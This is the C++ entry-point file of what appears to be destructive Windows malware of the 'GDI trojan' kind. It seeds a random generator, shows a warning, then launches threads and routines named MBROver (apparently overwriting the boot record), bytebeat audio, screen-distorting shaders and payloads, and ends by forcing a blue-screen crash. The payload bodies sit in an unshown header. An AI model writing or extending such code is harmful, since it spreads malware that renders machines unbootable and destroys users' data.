typedef struct IUnknown IUnknown;
#include "payloads.h"


VOID WINAPI InitAll( VOID ) {
	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");

	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModUser32);
}

INT WINAPI __stdcall WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd)
{
	SeedXorshift32((DWORD)__rdtsc());
	InitAll();

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
	Warning(0);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MBROver), (PVOID)1000, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(ByteBe1), 0, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(ConstPayload), 0, 0, NULL);
	ExecuteShader(Shader1, 10);
	ExecuteShader(Shader3, 10);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(ByteBe2), 0, 0, NULL);
	Payload1();
	ExecuteShader(Shader2, 50);
	ExecuteShader(Shader4, 50);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(ByteBe3), 0, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(Payload3), 0, 0, NULL);
	ExecuteShader(Shader5, 50);
	BSOD();
}
